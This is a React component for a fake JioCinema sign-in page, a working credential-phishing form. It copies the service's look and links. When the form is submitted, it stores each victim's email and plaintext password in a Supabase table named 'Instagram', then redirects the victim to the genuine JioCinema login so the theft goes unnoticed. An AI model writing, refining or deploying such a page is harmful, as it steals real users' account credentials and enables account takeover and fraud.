import React, { useState } from "react";
import "./JioCinemaLogin.css";
import { supabase } from "../../supabase";

const JioCinemaLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.jiocinema.com/login";
    }
  };

  return (
    <div className="jiocinema-bg">
      <div className="jiocinema-center">
        <div className="jiocinema-logo-svg">
          <svg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
            <circle cx="30" cy="30" r="30" fill="#ff0080"/>
            <circle cx="30" cy="30" r="22" fill="#fff"/>
            <circle cx="30" cy="30" r="18" fill="#ff0080"/>
            <rect x="22" y="22" width="16" height="16" rx="4" fill="#fff"/>
            <rect x="26" y="28" width="8" height="2" rx="1" fill="#ff0080"/>
          </svg>
        </div>
        <div className="jiocinema-login-box">
          <h1 className="jiocinema-title">Sign In</h1>
          <form className="jiocinema-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="jiocinema-login-input"
              placeholder="Enter Mobile Number or Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              className="jiocinema-login-input"
              placeholder="Enter Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="jiocinema-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="jiocinema-error">{error}</div>}
            {success && <div className="jiocinema-success">Login saved!</div>}
          </form>
          <div className="jiocinema-links">
            <a href="https://www.jiocinema.com/forgot-password" target="_blank" rel="noopener noreferrer" className="jiocinema-link">Forgot Password?</a>
            <span className="jiocinema-divider">|</span>
            <a href="https://www.jiocinema.com/signup" target="_blank" rel="noopener noreferrer" className="jiocinema-link">Sign Up</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default JioCinemaLogin;
